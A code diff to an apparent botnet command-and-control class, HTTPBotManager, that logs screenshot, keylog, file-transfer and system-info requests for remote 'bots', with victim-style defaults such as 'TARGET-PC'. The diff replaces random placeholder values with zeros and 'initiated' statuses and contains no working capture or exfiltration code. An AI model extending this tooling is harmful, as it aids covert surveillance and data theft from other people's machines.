@@ -244,13 +244,14 @@ class HTTPBotManager extends EventEmitter {
                 botId: botId,
                 timestamp: new Date(),
                 data: 'screenshot_data_placeholder',
-                size: Math.floor(Math.random() * 1000000) + 100000
+                size: 0,
+                status: 'capture_initiated'
             };
 
             this.screenshots.get(botId).push(screenshot);
             this.stats.screenshotsTaken++;
             this.emit('screenshotCaptured', screenshot);
-            logger.info(`Screenshot captured for bot ${botId}`);
+            logger.info(`Screenshot capture initiated for bot ${botId}`);
             return screenshot;
         }
         return null;
@@ -265,13 +266,14 @@ class HTTPBotManager extends EventEmitter {
                 timestamp: new Date(),
                 duration: duration,
                 data: 'keylog_data_placeholder',
-                size: Math.floor(Math.random() * 10000) + 1000
+                size: 0,
+                status: 'collection_initiated'
             };
 
             this.keylogs.get(botId).push(keylog);
             this.stats.keylogsCollected++;
             this.emit('keylogCollected', keylog);
-            logger.info(`Keylog collected for bot ${botId}`);
+            logger.info(`Keylog collection initiated for bot ${botId}`);
             return keylog;
         }
         return null;
@@ -287,13 +289,13 @@ class HTTPBotManager extends EventEmitter {
                 direction: direction,
                 timestamp: new Date(),
                 status: 'in_progress',
-                size: Math.floor(Math.random() * 10000000) + 1000000
+                size: 0
             };
 
             this.fileTransfers.get(botId).push(transfer);
             this.stats.filesTransferred++;
             this.emit('fileTransferStarted', transfer);
-            logger.info(`File transfer started for bot ${botId}: ${filePath}`);
+            logger.info(`File transfer initiated for bot ${botId}: ${filePath}`);
             return transfer;
         }
         return null;
@@ -304,20 +306,21 @@ class HTTPBotManager extends EventEmitter {
             const systemInfo = {
                 botId: botId,
                 timestamp: new Date(),
-                os: 'Windows 10',
-                arch: 'x64',
-                user: 'Administrator',
-                hostname: 'TARGET-PC',
-                ip: '192.168.1.100',
-                country: 'US',
-                processes: Math.floor(Math.random() * 200) + 50,
-                memory: Math.floor(Math.random() * 16) + 4,
-                disk: Math.floor(Math.random() * 1000) + 100
+                os: 'Unknown',
+                arch: 'Unknown',
+                user: 'Unknown',
+                hostname: 'Unknown',
+                ip: 'Unknown',
+                country: 'Unknown',
+                processes: 0,
+                memory: 0,
+                disk: 0,
+                status: 'collection_initiated'
             };
 
             this.systemInfo.set(botId, systemInfo);
             this.emit('systemInfoCollected', systemInfo);
-            logger.info(`System info collected for bot ${botId}`);
+            logger.info(`System info collection initiated for bot ${botId}`);
             return systemInfo;
         }
         return null;
